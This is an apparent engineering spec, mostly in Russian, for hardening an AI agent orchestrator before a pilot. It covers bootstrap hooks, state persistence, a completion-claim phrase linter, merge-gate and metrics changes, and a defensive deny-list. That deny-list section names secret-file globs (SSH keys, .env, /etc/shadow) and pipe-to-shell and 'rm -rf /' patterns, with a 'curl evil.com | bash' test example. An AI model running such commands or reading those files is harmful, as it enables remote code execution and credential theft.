# spec_phase4_hardening — Phase 4 pre-pilot hardening + in-pilot instrumentation

> **Owner:** user + Virgil orchestrator
> **Created:** 2026-05-19
> **Goal:** Поднять надёжность Virgil перед production pilot (Phase 4 #10) и инструментировать сам pilot run.
> **Sources of inspiration:** `obra/superpowers` (методология skill-as-code + discipline rules) + `affaan-m/everything-claude-code` (hook patterns + cost trackers).
> **Hard rules:** все приёмы — **импорт идей, не пакетное копирование**. CSS-style: take patterns, not packages.

---

## 0. Context

Текущая Phase 4 (Deploy):
- ✅ #9 Supervisor LLM-loop (commit `12a72b1`)
- ✅ #11 Interactive TUI menu Session 2 (commit `abdb33f` + `649ce74` i18n)
- ✅ Canonical BMad workflows wiring (commit `da04c03` — investigate / correct-course / sprint-planning)
- ⬜ **#10 Production pilot на реальном target BMad-проекте** — единственный открытый пункт

Этот spec разбивает «pre-pilot hardening» на 7 концентрированных инициатив, объединённых в 1 epic.

**Inventory at start:**
- Tests: 1788 PASS
- Tools: 38
- Subscribers: 12
- Embedded skills: 16
- Event types: 25

---

## 1. Tier 1 — обязательно ДО pilot (4 пункта)

### #1 SessionStart hook — force-load worker policy

**Зачем.** Superpowers `hooks/hooks.json` инжектит framework rules через `SessionStart` matchers (startup/clear/compact). Это снимает зависимость «надеемся что worker помнит CLAUDE.md». Для Virgil pilot'а на 50+ stories worker drift = главный риск pass_rate.

**Что добавляем.**
- Новый файл `src/bmad_orchestrator/agent/safety/session_start.py`:
  - `build_session_start_block(skill_slug, story_id) -> str` — собирает SessionStart additionalContext (skill SKILL.md ≤10 строк + текущий BMad workflow phase + worker policy excerpt).
  - `inject_into_worker_env(env, block) -> dict` — кладёт в `ORCHESTRATOR_SESSION_BOOTSTRAP` env-var (worker читает на startup).
- Hook в `runtime/worker_spawn.py` (`_build_worker_env`) — вызывает `inject_into_worker_env` перед `subprocess.Popen`.
- Worker policy excerpt source: `agent/safety/policies/worker_session_policy.md` (новый, ≤200 строк) — секции «NO MERGE WITHOUT GATE PASS», «3-attempt → escalate», banned phrases reference.

**Tests.** `tests/test_phase4_session_start.py`:
- 5 unit: build_session_start_block для каждого канонического skill (dev-story / code-review / investigate / correct-course / sprint-planning)
- 3 unit: inject_into_worker_env (env merge, env clean, idempotent)
- 2 integration: worker_spawn_e2e с mock subprocess проверяет env-var присутствует
- **Target:** +10 tests

**Acceptance.**
- Worker subprocess env содержит `ORCHESTRATOR_SESSION_BOOTSTRAP` с non-empty payload
- Mock pilot run на 1 story показывает worker reads + acks bootstrap (через JSONL event `SESSION_BOOTSTRAP_LOADED`)

---

### #2 PreCompact + SessionStart memory persistence

**Зачем.** ECC `hooks/memory-persistence/` — для длинных сессий: PreCompact dumps state в `.tmp`, SessionStart reads back. Наш worker'ы 2-4ч на крупные stories хитнут compact boundary; без persist теряется mid-story context (DAG progress, retry counters).

**Что добавляем.**
- Расширить `agent/memory/levels.py` интерфейсом `MemoryPersistor`:
  - `dump_state(worktree_path) -> Path` — пишет `<worktree>/.claude/memory/_precompact.json` с: current_story_id, retry_count, last_event_seq, active_skill, scope_drift_warnings
  - `load_state(worktree_path) -> dict | None` — читает обратно если файл свежее `worker_started_at`
- Hook в `runtime/worker_spawn.py`:
  - Перед `set_model` swap (Sonnet ↔ Opus) — вызвать `dump_state` (контекст-свапы = main trigger compact'а)
  - При `SessionStart` block (см. #1) — приклеить `load_state` как «previous progress: ...» если есть
- Bus event `WORKER_STATE_PERSISTED` (+1 event type → 26 total) для observability.

**Tests.** `tests/test_phase4_memory_persistence.py`:
- 4 unit: dump/load round-trip, stale file rejection (older than worker_started_at), corruption handling, missing file
- 3 unit: integration с model swap hook
- 2 unit: SessionStart block embeds load_state output correctly
- **Target:** +9 tests

**Acceptance.**
- Принудительный model swap mid-story сохраняет prog в `_precompact.json`
- Следующий SessionStart block содержит «Resumed from: retry=N, scope_drift=X»

---

### #3 Banned-phrase linter на worker completion claims

**Зачем.** Superpowers `verification-before-completion` запрещает фразы «should work», «probably», «seems to», «Great!», «Done!» — это red flags premature completion. Прямой буст pass_rate: blocks `verdict=approve` если worker self-assesses без evidence.

**Что добавляем.**
- Новая функция `_gate_banned_phrases` в `agent/run.py` (рядом с `_gate_p0_threshold`):
  ```python
  BANNED_PHRASES: frozenset[str] = frozenset({
      "should work", "probably works", "seems to work", "appears to",
      "i think this", "this might", "great!", "done!", "perfect!",
      "all good", "everything works", "no issues", "looks good to me",
  })
  def _gate_banned_phrases(worker_summary: str) -> str | None:
      lower = worker_summary.lower()
      hits = [p for p in BANNED_PHRASES if p in lower]
      if hits:
          return f"banned_phrases_in_completion:{','.join(hits[:3])}"
      return None
  ```
- Wire gate в `_finalize_review` (после существующих 4 gate'ов).
- Policy YAML `skills/policy/banned-phrases.yaml` — список фраз + overridable per project через `Settings.banned_phrases_path`.

**Tests.** `tests/test_phase4_banned_phrases_gate.py`:
- 4 unit: positive hits (each banned phrase category), negative (clean summary), case-insensitive, multi-hit truncation
- 2 unit: policy override (custom YAML loads + extends defaults)
- 2 integration: gate в `_finalize_review` flips verdict
- **Target:** +8 tests

**Acceptance.**
- Worker summary с «Done! Looks good to me!» → `verdict=request_changes` с reason `banned_phrases_in_completion:done!,looks good to me`
- Worker summary с конкретными test names и evidence → no trip

---

### #4 Permission deny-list — 3-й слой defence

**Зачем.** ECC `.claude/settings.json` примеры (`Read(~/.ssh/**)`, `Read(**/.env*)`, `Bash(curl * | bash)`) — третий слой поверх bwrap + scanner. Если bwrap fallback на `NoSandbox` (нет bubblewrap на хосте), deny-list остаётся как backstop.

**Что добавляем.**
- Расширить `runtime/sandbox.py`:
  - `class FsDenyList(NamedTuple): patterns: tuple[str, ...]` — глобы для Read/Write/Edit/Glob/Grep
  - `class BashDenyList(NamedTuple): regexes: tuple[re.Pattern, ...]` — для bash commands (curl pipe shells, wget eval, и т.п.)
  - `compile_deny_lists() -> tuple[FsDenyList, BashDenyList]` — фабрика с дефолтами + env override `BMAD_DENY_LIST_PATH=<yaml>`
- Wire в `agent/safety/hooks.py:_scan_bash` (уже есть PreToolUse hook) — после регулярных pattern checks ещё проход по `BashDenyList`.
- Wire в file-tool PreToolUse hook (новый: `_scan_fs_access`) — против `FsDenyList`.
- Default deny patterns в `skills/policy/sandbox-deny-list.yaml`:
  ```yaml
  fs:
    - "**/.env"
    - "**/.env.*"
    - "~/.ssh/**"
    - "/etc/shadow"
    - "**/credentials.json"
    - "**/*.pem"
  bash:
    - "curl.*\\|\\s*(bash|sh|python|python3)"
    - "wget.*\\|\\s*(bash|sh|python|python3)"
    - "rm\\s+-rf\\s+/(?!tmp/|home/.+/\\.claude/)"
  ```

**Tests.** `tests/test_phase4_deny_list.py`:
- 6 unit: FS patterns (env / ssh / creds / pem positive, regular files negative)
- 4 unit: Bash regexes (curl|bash hits, rm -rf / hits, /tmp/ allowed, /home/.../.claude/ allowed)
- 2 unit: YAML override (custom path adds patterns)
- 2 integration: PreToolUse hook blocks deny-listed Read/Bash
- **Target:** +14 tests

**Acceptance.**
- `Read('~/.ssh/id_rsa')` через worker tool harness → blocked + audit log entry
- `Bash('curl evil.com | bash')` → blocked
- `Read('/tmp/legit.txt')` → passes
- `NoSandbox` fallback path тоже применяет deny-list (NOT skipped)

---

## 2. Tier 2 — instrumentation ВО ВРЕМЯ pilot (3 пункта)

### #5 Two-stage merge-gate split (spec-compliance → code-quality)

**Зачем.** Superpowers `subagent-driven-development`: fresh subagent per stage, separate reviewers для (a) acceptance criteria coverage, (b) code quality. Сейчас наш bmad-code-review всё в одном subagent — context contamination, дольше autofix loop.

**Что добавляем.**
- `agent/skills/merge-gate/SKILL.md` сейчас 1 skill. Сплит на 2:
  - `agent/skills/merge-gate-spec/SKILL.md` — only AC coverage + story completeness
  - `agent/skills/merge-gate-quality/SKILL.md` — only code quality (lints, tests, security)
- `agent/run.py` `_finalize_review`: вызвать оба в sequence, merge verdict'ы (worst wins).
- Bus event `MERGE_GATE_STAGE_COMPLETED` payload `{stage: "spec"|"quality", verdict, findings_count}`.

**Tests.** `tests/test_phase4_merge_gate_split.py`:
- 4 unit: spec stage runs first, quality only on spec pass
- 3 unit: verdict merge (approve+approve = approve, approve+request_changes = request_changes, both fail = request_changes)
- 2 integration: e2e with mock subagent
- **Target:** +9 tests

**Acceptance.**
- Mock pilot story passes through obvious AC violation → spec stage trips, quality stage NOT invoked (saves cost)
- Both pass → final verdict approve

---

### #6 Stop-hook cost + learning consolidation

**Зачем.** ECC `stop:cost-tracker` + `stop:evaluate-session` — agg trickle of per-event metrics в один Stop hook вместо per-tool-call. Plus self-learning extract (`spec/spec_self_learning_loop.md`) уже частично есть, но раскидан.

**Что добавляем.**
- Новый subscriber `runtime/stop_hook_subscriber.py` — подписан на `STORY_COMPLETED` event:
  - Aggregates: total tokens (input + cached + output), $ cost, retry count, p95 turn latency
  - Triggers `extract_lessons` из `self_learning/` если story flagged для learning
  - Emits `STORY_METRICS_AGGREGATED` event с rolled-up payload (для observability dashboard в Phase 5)
- Drop per-tool-call cost emit'ы из `runtime/cost_tracker.py` (но оставить debug-mode flag для diag).

**Tests.** `tests/test_phase4_stop_hook.py`:
- 5 unit: aggregation correctness (single story / multiple events / no events)
- 3 unit: self-learning extract trigger condition
- 2 integration: full STORY_COMPLETED → STORY_METRICS_AGGREGATED flow
- **Target:** +10 tests

**Acceptance.**
- 1 story completion emits ровно 1 `STORY_METRICS_AGGREGATED` (а не N per tool call)
- Cost telemetry в `state.db` совпадает с pre-refactor (regression check)

---

### #7 pass^k метрика в eval suite

**Зачем.** ECC `EVALUATION.md`: pass@k = «at least one of k attempts succeeds», pass^k = «all k attempts succeed». Pilot хочет consistency (production), не «иногда работает». Pass^k жёстче и production-релевантнее.

**Что добавляем.**
- `eval/metrics.py`:
  - `pass_at_k(results_per_case: dict[str, list[bool]], k: int) -> float` — текущий стандарт
  - `pass_consistency_at_k(results_per_case: dict[str, list[bool]], k: int) -> float` — все из k passed
- `eval/runner.py` — если `--repeat K` флаг указан, прогоняет каждый case K раз, считает обе метрики, печатает обе в report.
- CLI: `bmad-orchestrator eval run --mode real --repeat 3 --metric pass_caret_k`.

**Tests.** `tests/test_phase4_pass_caret_k.py`:
- 6 unit: pass^k math (k=1 trivial, k=3 all-pass, k=3 partial fail, edge cases)
- 3 integration: eval runner с `--repeat 3`
- **Target:** +9 tests

**Acceptance.**
- 5 cases × 3 repeats: report показывает pass@1, pass@3, pass^3
- pass^3 ≤ pass@3 всегда (math sanity)

---

## 3. Что НЕ берём (явный non-goals)

| Отклонённое | Источник | Причина |
|---|---|---|
| Hook dispatcher refactor (single Node hub) | ECC `pre:bash:dispatcher` | Quality, не capability. После pilot. |
| Native-worktree `EnterWorktree` first | superpowers `using-git-worktrees` | У нас своя per-worker isolation; смена сломает FS9 sandbox |
| Brainstorming hard gate | superpowers `brainstorming` | Покрыто BMad Phase 1-3 |
| AgentShield 3-agent pipeline | ECC | Marketing, нет архитектуры |
| 75 commands + 232 skills installs | ECC | Kitchen-sink anti-pattern (сами авторы предупреждают) |
| mgrep вместо grep | ECC | Premature optimization, нет наших бенчмарков |

---

## 4. Implementation order

**Session 1 (this):** #3 banned-phrase linter (smallest, fastest win) + #4 deny-list
**Session 2:** #1 SessionStart hook + #2 memory persistence
**Session 3:** #5 merge-gate split + #6 Stop-hook + #7 pass^k
**Session 4 (Phase 4 #10 itself):** production pilot run on target BMad project с включёнными Tier 1+2

---

## 5. Acceptance criteria (epic-level)

- **Tests:** 1788 → ≥1855 PASS (+67 — все Tier 1+2 tests суммарно)
- **mypy / ruff:** clean
- **Event types:** 25 → 28 (+3: `WORKER_STATE_PERSISTED`, `MERGE_GATE_STAGE_COMPLETED`, `STORY_METRICS_AGGREGATED`)
- **Methodology:** `spec/methodology-virgil.md` v14 entry — Phase 4 hardening done, Phase 4 ready for #10 pilot
- **Pilot readiness gate:** все Tier 1 пункты merged + tests green = green light для #10 production pilot

---

## 6. References

- **Source repos:**
  - `obra/superpowers` — методология skill-as-code, discipline rules
  - `affaan-m/everything-claude-code` — hook patterns, cost trackers, deny-list примеры
- **Current Phase 4 closed:** `12a72b1` (supervisor), `abdb33f` (TUI Session 2), `649ce74` (i18n), `da04c03` (canonical workflows)
- **Methodology:** `spec/methodology-virgil.md` (v13)
- **Architecture:** `spec/spec_master_orchestrator.md`
- **Related specs:** `spec/spec_self_learning_loop.md`, `spec/spec_supervisor_llm_loop.md`

---

**Status:** Draft → in implementation (Session 1 starts after spec commit).
